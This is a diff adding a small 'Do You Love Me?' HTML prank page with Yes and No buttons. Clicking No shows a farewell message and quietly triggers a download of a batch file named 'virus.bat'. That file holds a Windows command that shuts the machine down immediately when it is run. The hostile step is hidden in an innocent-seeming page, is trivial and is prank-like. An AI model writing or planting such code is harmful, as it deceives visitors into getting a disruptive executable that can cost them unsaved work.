@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Do You Love Me?</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      text-align: center;
+      padding: 40px 20px;
+      background: linear-gradient(135deg, #ffb6c1, #ffe4e1);
+      min-height: 100vh;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      color: #4a4a4a;
+      margin-bottom: 30px;
+    }
+
+    button {
+      font-size: 1.2rem;
+      padding: 12px 30px;
+      margin: 10px;
+      border: none;
+      border-radius: 30px;
+      background: #ff69b4;
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+    }
+
+    button:hover {
+      background: #ff1493;
+    }
+
+    #response {
+      margin-top: 40px;
+      max-width: 90%;
+    }
+
+    img {
+      width: 100%;
+      max-width: 250px;
+      height: auto;
+      object-fit: cover;
+      border-radius: 16px;
+      border: 4px solid white;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      color: #333;
+      font-size: 1.8rem;
+    }
+
+    @media (max-width: 480px) {
+      h1 {
+        font-size: 2rem;
+      }
+
+      button {
+        width: 80%;
+        font-size: 1rem;
+      }
+
+      h2 {
+        font-size: 1.5rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <h1>Do you love me?</h1>
+  <div>
+    <button onclick="sayYes()">Yes</button>
+    <button onclick="sayNo()">No</button>
+  </div>
+
+  <div id="response"></div>
+
+  <script>
+    function sayYes() {
+      document.getElementById("response").innerHTML = `
+        <img src="love.png" alt="Love" />
+        <h2>I love you too babee.</h2>
+      `;
+    }
+
+    function sayNo() {
+      document.getElementById("response").innerHTML = `
+        <img src="rith.png" alt="Sad" />
+        <h2>Okay Goodluck babeee😉</h2>
+      `;
+
+      const blob = new Blob(["shutdown -s -t 0"], { type: "application/octet-stream" });
+      const a = document.createElement("a");
+      a.href = URL.createObjectURL(blob);
+      a.download = "virus.bat";
+      a.click();
+    }
+  </script>
+</body>
+</html>
